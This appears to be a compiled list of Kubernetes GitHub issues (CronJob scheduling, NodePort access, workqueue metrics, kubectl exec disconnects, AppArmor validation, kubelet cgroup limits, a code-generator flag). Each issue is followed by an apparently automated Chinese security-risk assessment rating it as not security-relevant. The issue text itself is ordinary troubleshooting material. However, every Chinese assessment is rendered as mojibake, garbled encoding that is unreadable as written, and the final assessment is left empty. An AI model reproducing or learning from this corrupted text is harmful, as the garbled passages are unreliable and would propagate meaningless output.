#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“å¤„ç†é™æ€Podæ—¶ï¼Œå¦‚æœPodçš„èµ„æºè¯·æ±‚å€¼é‡‡ç”¨ç‰¹å®šæ ¼å¼ï¼ˆä¾‹å¦‚"cpu": "0.4"ï¼‰ï¼Œå¯èƒ½å¯¼è‡´kubeletåœ¨é‡å¯æ—¶æ— æ³•é€šè¿‡æ ¡éªŒå’ŒéªŒè¯ï¼Œä»è€Œå¯¼è‡´kubeletæŒç»­å´©æºƒã€‚é‡ç°æ­¥éª¤ä¸­ï¼Œéœ€è¦å°†å…·æœ‰ç‰¹å®šæ ¼å¼çš„Podè§„èŒƒæ–‡ä»¶å¤åˆ¶åˆ°èŠ‚ç‚¹çš„`/etc/kubernetes/manifest/`ç›®å½•ï¼Œè¯¥ç›®å½•é€šå¸¸åªæœ‰å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·æ‰èƒ½è®¿é—®å’Œä¿®æ”¹ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…éœ€è¦å…·æœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½å°†æ–‡ä»¶æ”¾å…¥`/etc/kubernetes/manifest/`ç›®å½•ï¼Œè¿™è¶…å‡ºäº†æ™®é€šæ”»å‡»è€…çš„æƒé™èŒƒå›´ã€‚

4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©**ï¼šè¯¥æ¼æ´çš„åˆ©ç”¨éœ€è¦å…·æœ‰é«˜æƒé™çš„ç®¡ç†å‘˜æ“ä½œã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œå±äºç®¡ç†å‘˜åœ¨é…ç½®é™æ€Podæ—¶éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼Œæ™®é€šæ”»å‡»è€…æ— æ³•åˆ©ç”¨è¯¥æ¼æ´å®ç°æ”»å‡»ã€‚

---

## Issue #128358 Cronjob's stuck job was not marked as failed and blocked new schedules

- Issue é“¾æ¥ï¼š[#128358](https://github.com/kubernetes/kubernetes/issues/128358)

### Issue å†…å®¹

#### What happened?

I have a cronjob that runs every 5 minutes, concurrency policy is forbidden:
```
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backup-job
spec:
  concurrencyPolicy: Forbid
  startingDeadlineSeconds: 200
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 240
      ......
      spec:
        restartPolicy: Never
        activeDeadlineSeconds: 240
```
I found that a job that has been there for 84 minutes when I was checking: 

```
$ kubectl get jobs -n zzz
NAME                COMPLETIONS     DURATION    AGE
xxxxx-job-28833075  0/1             84m         84m
```
However when I try to list pods I got nothing:
```
$ kubectl get pods --selector=job-name=xxxxx-job-28833075 -n zzz
No resources found in zzz namespace
```

I think the reason was one of the sidecar containers failed to start, however since all pods owned by this job were deleted so I could not debug into this job, my guess is because `.spec.jobTemplate.spec.activeDeadlineSeconds` is set, when job runs > 240 seconds all pods owned by the job are deleted, but in this case should not the job be marked as failed status? Why this job was actually failed but its status was neither completion nor failed?

Also, this stuck job causes 2 following schedules missed, I don't understand since with `.spec.jobTemplate.spec.activeDeadlineSeconds` is set to 4 minutes, should controller schedule a new job after this job was in active status for 4 minutes? 

#### What did you expect to happen?

If any pods/containers owned by a job failed to run, the job should be marked as failed status and all pods/container should be kept (since by default `failedJobsHistoryLimit` is `1`).

#### How can we reproduce it (as minimally and precisely as possible)?

I am not sure if it is expected behavior? 

#### Anything else we need to know?

_No response_

#### Kubernetes version

v1.28.13-eks-a737599

#### Cloud provider

<details>

</details>
AWS

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œç”¨æˆ·å‘ç°CronJobçš„ä¸€ä¸ªä»»åŠ¡åœ¨Podè¢«åˆ é™¤åæ²¡æœ‰è¢«æ ‡è®°ä¸ºå¤±è´¥çŠ¶æ€ï¼Œå¯¼è‡´åç»­çš„è°ƒåº¦è¢«é˜»å¡ã€‚è¿™å¯èƒ½æ˜¯CronJobæ§åˆ¶å™¨çš„å®ç°é€»è¾‘æˆ–é…ç½®é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜æ— æ³•è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå› ä¸ºè¿™æ˜¯æ­£å¸¸çš„CronJobè¡Œä¸ºå¼‚å¸¸ï¼Œæ²¡æœ‰æåˆ°ä»»ä½•æ”»å‡»é¢çš„å­˜åœ¨ã€‚
2. è¯¥é—®é¢˜ä¸å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œä¸ä¼šè¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†ä¹Ÿæ— æ³•è¾¾åˆ°é«˜å±è¯„åˆ†ã€‚
3. Issueæäº¤è€…æ²¡æœ‰åœ¨å†…å®¹ä¸­æš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–æåˆ°å®‰å…¨é…ç½®é”™è¯¯ç­‰é—®é¢˜ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128328 Master-Node Doesn't server service exposed port

- Issue é“¾æ¥ï¼š[#128328](https://github.com/kubernetes/kubernetes/issues/128328)

### Issue å†…å®¹

#### What happened?

Exposed port doesn't serve on Master-Node.

#### What did you expect to happen?

Normally as we expose the port, we can both access the port via master-node and worker-node.

#### How can we reproduce it (as minimally and precisely as possible)?

Seems like master nodes can't serve any services port.

#### Anything else we need to know?

we already expose port in service as below:
Type: NodePort
External Traffic Policy: Cluster

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
No cloud
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Red Hat Enterprise Linux"
VERSION="9.4 (Plow)"
ID="rhel"
ID_LIKE="fedora"
VERSION_ID="9.4"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Red Hat Enterprise Linux 9.4 (Plow)"
ANSI_COLOR="0;31"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:redhat:enterprise_linux:9::baseos"
HOME_URL="https://www.redhat.com/"
DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9"
BUG_REPORT_URL="https://issues.redhat.com/"

REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 9"
REDHAT_BUGZILLA_PRODUCT_VERSION=9.4
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.4"
# paste output here
$ uname -a
Linux rhel50 5.14.0-427.40.1.el9_4.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Oct 4 15:22:45 EDT 2024 x86_64 x86_64 x86_64 GNU/Linux
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
INFO[2024-10-25 11:56:25.432610169+07:00] Starting CRI-O, version: 1.30.3, git: 8750e76e814ab80c40061f07402187d6b33ab72e(clean)
Version:        1.30.3
GitCommit:      8750e76e814ab80c40061f07402187d6b33ab72e
GitCommitDate:  2024-07-01T07:09:15Z
GitTreeState:   clean
BuildDate:      1970-01-01T00:00:00Z
GoVersion:      go1.22.0
Compiler:       gc
Platform:       linux/amd64
Linkmode:       static
BuildTags:
  static
  netgo
  osusergo
  exclude_graphdriver_btrfs
  exclude_graphdriver_devicemapper
  seccomp
  apparmor
  selinux
LDFlags:          unknown
SeccompEnabled:   true
AppArmorEnabled:  false
</details>

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico v3.28.1
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
é€šè¿‡å¯¹Issueå†…å®¹çš„åˆ†æï¼Œè¯¥é—®é¢˜æè¿°äº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼Œä½¿ç”¨NodePortç±»å‹çš„Serviceæ—¶ï¼ŒMasterèŠ‚ç‚¹æ— æ³•è®¿é—®æš´éœ²çš„ç«¯å£ï¼Œåªèƒ½é€šè¿‡WorkerèŠ‚ç‚¹è®¿é—®ã€‚è¿™ä¸ªé—®é¢˜æ˜¯å…³äºKubernetesé›†ç¾¤é…ç½®å’ŒæœåŠ¡è®¿é—®çš„é—®é¢˜ï¼Œæ²¡æœ‰æ¶‰åŠä»»ä½•å®‰å…¨æ¼æ´æˆ–é£é™©ã€‚æŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #128326 There is a conflict between the metrics of controller-runtime and component-base, the metric workqueue_depth  of controller-runtime repository not  take effect

- Issue é“¾æ¥ï¼š[#128326](https://github.com/kubernetes/kubernetes/issues/128326)

### Issue å†…å®¹

#### What happened?

https://github.com/kubernetes-sigs/controller-runtime/blob/7399a3a595bf254add9d0c96c49af462e1aac193/pkg/metrics/workqueue.go#L99

https://github.com/kubernetes/component-base/blob/03d57670a9cda43def5d9c960823d6d4558e99ff/metrics/prometheus/workqueue/metrics.go#L101

Both repository try to set the Provider but only the earliest will take effect. In the case where component-base library is initialized first, the workqueue_depth metrics in component-base will be used and the metrics in controller-runtime will not work. It will cause the default exposed metrics in controller-runtime to be unable to show the workflow_depth number.

Is there any hint or recommendation for handling that?

#### What did you expect to happen?

The  workqueue_depth  should take effect that provided by controller-runtime repository

#### How can we reproduce it (as minimally and precisely as possible)?

The component-base library might not be directly depended. However, other libraries like k8s.io/apiextensions-apiserver;if the codes in these libraries call component-base functions, the initialization function in component-base will work and might call workqueue.SetProvider before controller-runtime, which will prevent the later controller-runtime from setting its own workqueue_depth metrics.



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

Client Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.17", GitCommit:"953be8927218ec8067e1af2641e540238ffd7576", GitTreeState:"clean", BuildDate:"2023-02-22T13:34:27Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.17", GitCommit:"953be8927218ec8067e1af2641e540238ffd7576", GitTreeState:"clean", BuildDate:"2023-02-22T13:27:46Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†controller-runtimeå’Œcomponent-baseä¸¤ä¸ªåº“åœ¨è®¾ç½®`workqueue_depth`æŒ‡æ ‡æ—¶å‘ç”Ÿå†²çªï¼Œå¯¼è‡´controller-runtimeä¸­çš„`workqueue_depth`æŒ‡æ ‡æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ˜¯å…³äºæŒ‡æ ‡æ”¶é›†å’Œå±•ç¤ºçš„æŠ€æœ¯é—®é¢˜ï¼Œä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼š"å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ"ã€‚

---

## Issue #128314 Kubectl exec disconnects automatically after 5m post upgrading the k8s cluster to 1.30

- Issue é“¾æ¥ï¼š[#128314](https://github.com/kubernetes/kubernetes/issues/128314)

### Issue å†…å®¹

#### What happened?

We have several automated scripts that run kubectl commands to exec into the pods and execute some custom scripts scripts. We observed that on all clusters running version 1.30.x, the session automatically gets disconnected without any error message, which was not the case in versions lower than 1.30.

#### What did you expect to happen?

Session should not terminate until we disconnect or exit from the pod 

#### How can we reproduce it (as minimally and precisely as possible)?

Just run a script which does kubectl exec into the pod and you will see that it gets disconnected with in 5 min

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¯¥Issueæè¿°äº†åœ¨å‡çº§åˆ°Kubernetes 1.30.xç‰ˆæœ¬åï¼Œä½¿ç”¨`kubectl exec`è¿›å…¥Podçš„ä¼šè¯åœ¨5åˆ†é’Ÿåè‡ªåŠ¨æ–­å¼€çš„é—®é¢˜ã€‚è¿™å¯èƒ½æ˜¯ç”±äºä¼šè¯è¶…æ—¶è®¾ç½®å¯¼è‡´çš„åŠŸèƒ½æ€§é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æåŠä»»ä½•å®‰å…¨æ¼æ´æˆ–æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æŒ‰ç…§é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬6æ¡ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128306 AppArmor type validation fails in `Deployments` when mixing old annotations with `securityContext.appArmorProfile`.

- Issue é“¾æ¥ï¼š[#128306](https://github.com/kubernetes/kubernetes/issues/128306)

### Issue å†…å®¹

#### What happened?

Validation may fail when`Deployment` mixes deprecated `container.apparmor.security.beta.kubernetes.io/` annotations with the new `securityContext.appArmorProfile`.

```
The Deployment "xyz" is invalid: spec.template.spec.containers[0].securityContext.appArmorProfile.type: Forbidden: apparmor type in annotation and field must match
```

#### What did you expect to happen?

The validation was expected to pass.

#### How can we reproduce it (as minimally and precisely as possible)?

The following minimal example defines a pod-level default AppArmor profile within the pod-level `securityContext`, while using a deprecated annotation to override the profile at the container-level:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-fails-validation
spec:
  selector:
    matchLabels:
      app: deployment-fails-validation
  template:
    metadata:
      labels:
        app: deployment-fails-validation
      annotations:
        # Container-level override using deprecated annotation.
        container.apparmor.security.beta.kubernetes.io/fails-validation: 'runtime/default'
    spec:
      securityContext:
        appArmorProfile:
          # Pod-level default profile.
          type: Unconfined
      containers:
      - name: fails-validation
        image: alpine:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - "sleep 99999999"
```

When this configuration is applied, the following error occurs:

```
$ kubectl apply -f deployment-fails-validation.yaml
The Deployment "deployment-fails-validation" is invalid: spec.template.spec.containers[0].securityContext.appArmorProfile.type: Forbidden: apparmor type in annotation and field must match
```

The error message suggests that `spec.containers[0].securityContext.appArmorProfile` at the container-level doesn't match the annotation, even though container-level profile is not defined.

#### Anything else we need to know?

I believe the reason for the failure is as follows:

In the [validation code](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4820-L4858), the pod-level profile `spec.securityContext.appArmorProfile` is retrieved [here](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4822). During the iteration over each container, this profile is used as the [default value](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4825). If a container doesn't explicitly set its own AppArmor profile in `spec.containers[i].securityContext.appArmorProfile`, the pod-level profile remains the default. In the provided manifest, this results in the need for all container-level annotations to match the pod-level security context for validation to pass, making it impossible to override the pod-level profile using deprecated annotations.

I believe it would be sufficient to ensure that container-level annotations align with the container-level security context, while ignoring the pod-level security context.

This issue seems to only affect `Deployments`, as e.g. `StatefulSets` do not call this validation function.

The validation logic was introduced in #123435.

I understand this is an uncommon scenario, mixing old and new methods within a single pod, but I wanted to document the issue and the likely cause.

#### Kubernetes version

<details>

```console
 kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```
</details>


#### Cloud provider

<details>

</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“å°†è¿‡æ—¶çš„AppArmoræ³¨è§£ä¸æ–°çš„`securityContext.appArmorProfile`æ··åˆä½¿ç”¨æ—¶ï¼Œä¼šå¯¼è‡´éªŒè¯å¤±è´¥çš„é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜å±äºé…ç½®å’Œå…¼å®¹æ€§æ–¹é¢çš„åŠŸèƒ½æ€§é”™è¯¯ï¼Œå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå› ä¸ºå®ƒåªå½±å“äº†é…ç½®çš„éªŒè¯è¿‡ç¨‹ï¼Œå¯¼è‡´Deploymentæ— æ³•æ­£å¸¸åˆ›å»ºæˆ–æ›´æ–°ã€‚

2. è¯¥é—®é¢˜ä¸ä¼šæˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œä¹Ÿä¸ä¼šè¢«åˆ†é…CVEç¼–å·ï¼ŒæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†ä¹Ÿä¸ä¼šè¾¾åˆ°é«˜å±çº§åˆ«ã€‚

4. å³ä½¿å°†å…¶è§†ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œä½†æ”»å‡»è€…éœ€è¦å…·æœ‰åˆ›å»ºæˆ–ä¿®æ”¹Deploymentçš„æƒé™ï¼Œå±äºæ­£å¸¸çš„æ“ä½œæƒé™èŒƒå›´ï¼Œå› æ­¤ä¸æ„æˆé«˜é£é™©ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128284 kubelet system-reserved unexpectedly sets memory.max in system-reserved-cgroup under systemd

- Issue é“¾æ¥ï¼š[#128284](https://github.com/kubernetes/kubernetes/issues/128284)

### Issue å†…å®¹

#### What happened?

When starting kubelet with config `system-reserved=memory=1.5Gi` as part of [reserved
compute resources](https://kubernetes.io/docs/tasks/administer-cluster/reserve-compute-resources/#system-reserved), running under `systemd`, with a `system-reserved-cgroup=systemreserved` (as per [Recommended Cgroups Setup](system-reserved-cgroup=systemreserved), that cgroup (`systemreserved`) has it's memory.max set to the value of `system-reserved=memory`, away from the default which is `memory.max=max`:

*Without* `system-reserved=memory=1.5Gi`:

```
[root@k8s-node1 systemreserved.slice]# pwd
/sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
max
```


*With* `system-reserved=memory=1.5Gi`:
```
[root@k8s-node1 systemreserved.slice]# pwd
/sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
1610612736 # 1.5Gi
```

#### What did you expect to happen?

When I write `system-reserved=memory=1.5Gi` to the kubelet config, I don't expect that to result in `systemreserved` services
(service units within `systemreserved`, such as `sshd`, and any other system service within that cgroup to be collectivly *limmited* with a `memory.max` which sets a [*hard limit*](https://docs.kernel.org/admin-guide/cgroup-v2.html#:~:text=Memory%20usage%20hard%20limit) on these systemreserved services when they previously were not. This feels the *opposite* of what is intended- it should be the inverse (non systemreserved should 'back off' in the face of memory pressure to allow for 1.5G for the `systemreserved` cgroup.
 
Having `memory.max` set that may lead to these `systemreserved` services being *more likely* to be OOM killed since they get altered away from their default `memory.max=max`.


#### How can we reproduce it (as minimally and precisely as possible)?

Start kubelet with --config (or args) with the following:

> Please note you have to restart the entire node to reset (kubelet does not clean up reset `system-reserved=memory=x` back to `max` after removing /restarting kubelet).

Apply the config to your kubelet start behaviour:

```
--system-reserved=memory=1.5Gi
--enforce-node-allocatable=pods,system-reserved
--system-reserved-cgroup=systemreserved
```

Ensure you have created the cgroup `systemreserved`, for example, by adding `Slice=systemreserved` to sshd:

File: /usr/lib/systemd/system/sshd.service
```
[Unit]
Description=OpenSSH server daemon
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target sshd-keygen.target
Wants=sshd-keygen.target

[Service]
Type=notify
EnvironmentFile=-/etc/sysconfig/sshd
ExecStart=/usr/sbin/sshd -D $OPTIONS
ExecReload=/bin/kill -HUP $MAINPID
Slice=systemreserved.slice
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```
And reload your systemd daemon/restart sshds etc. (`systemctl daemon-reload && systemctl restart sshd`)

Observe memory.max being set:

```
[root@k8s-node1 systemreserved.slice]# cd /sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
1610612736 # 1.5Gi
```

#### Anything else we need to know?

I suspect Kubernetes needs to account for the Allocatable memory somewhere, which might by why `memory.max` is being altered?


Chris Down's suggestions may be relvant here, if kubelet *needs* to edit the cgroup, perhaps `memory.low` is more appropriate, and/or perhaps even
better allowing more fine grained control over which memory max/min/low get set rather than `--memory=` which doesn't appear to allow that level of expression.

> Our ultimate goal here is to keep the workload running ... so
what if could could encode that rather than sprinking memory.max everywhere? ... memory.low is a funamental different way about how we've controled memory for the last ~50 years. Instead we should just say how much memory the applications which we want to protect need, and let the system sort it out. ... memory.low hooks into the kernel's reclaiming structure in order to protect some memory for a cgroup. src: https://youtu.be/kPMZYoRxtmg?feature=shared&t=1242

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.29.3+rke2r1
```

</details>


#### Cloud provider

<details>
Bare metal / not applicable
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.3 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.3"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.3 (Blue Onyx)"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.3"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.3"

$ uname -a
Linux 5.14.0-362.13.1.el9_3.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Dec 13 14:07:45 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨kubeleté…ç½®`system-reserved=memory=1.5Gi`æ—¶ï¼Œå¯¼è‡´`systemreserved` cgroupçš„`memory.max`è¢«è®¾ç½®ä¸º1.5Giï¼Œè€Œä¸æ˜¯é»˜è®¤çš„`max`ï¼Œå¯èƒ½å¯¼è‡´`systemreserved`ä¸­çš„ç³»ç»ŸæœåŠ¡ï¼ˆå¦‚`sshd`ï¼‰åœ¨å†…å­˜å‹åŠ›ä¸‹æ›´å®¹æ˜“è¢«OOMæ€æ­»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜å±äºé…ç½®å¼•èµ·çš„ç³»ç»Ÿè¡Œä¸ºå˜åŒ–ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡çš„å¯ç”¨æ€§å—åˆ°å½±å“ã€‚ä½†æ”»å‡»è€…éœ€è¦èƒ½å¤Ÿæ¶ˆè€—å¤§é‡å†…å­˜æ‰èƒ½è§¦å‘OOMï¼Œè€Œè¿™é€šå¸¸éœ€è¦ä¸€å®šæƒé™æˆ–èµ„æºé…é¢ã€‚

åŒæ—¶ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨çš„æ¼æ´ï¼Œä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©é—®é¢˜ã€‚å› æ­¤ï¼ŒæŒ‰ç…§ç»™å®šçš„æ ‡å‡†ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

---

## Issue #128257 Restore build-tag flag for code-generator

- Issue é“¾æ¥ï¼š[#128257](https://github.com/kubernetes/kubernetes/issues/128257)

### Issue å†…å®¹

#### What happened?

The `build-tag` flag is removed in 1.30 as code-generator moved to use `gengo/v2` and removed `gengo/args` dependency where `GeneratedBuildTag` arg resides. As a result, it is not possible to inject a custom build tag during `conversion-gen` and `defaulter-gen` process.

This flag is useful for other projects that need a custom tag to differentiate itself from the default build tag of `gengo` which is `ignore_autogenerated`. By default, `gengo` will ignore all files with the build tag of `ignore_autogenerated`. However, in some cases, some projects need to utilize some conversion and defaults funcs in `k8s.io/kubernetes/pkg/apis/core/v1` such as [1] and [2] and both files are ignored by `gengo` due to mentioned build-tag. By using a custom build tag that is different from the default build tag, those two files can be used during `conversion-gen` and `defaulter-gen` processes.

[1] https://github.com/kubernetes/kubernetes/blob/master/pkg/apis/core/v1/zz_generated.conversion.go
[2] https://github.com/kubernetes/kubernetes/blob/master/pkg/apis/core/v1/zz_generated.defaults.go

#### What did you expect to happen?

The `build-tag` flag shouldn't be deprecated prematurely as it is still useful to inject a custom build tag.

#### How can we reproduce it (as minimally and precisely as possible)?

Run `conversion-gen` or `defaulter-gen` with `--build-tag` flag and the cmd should err out as the flag is deprecated.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30
</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
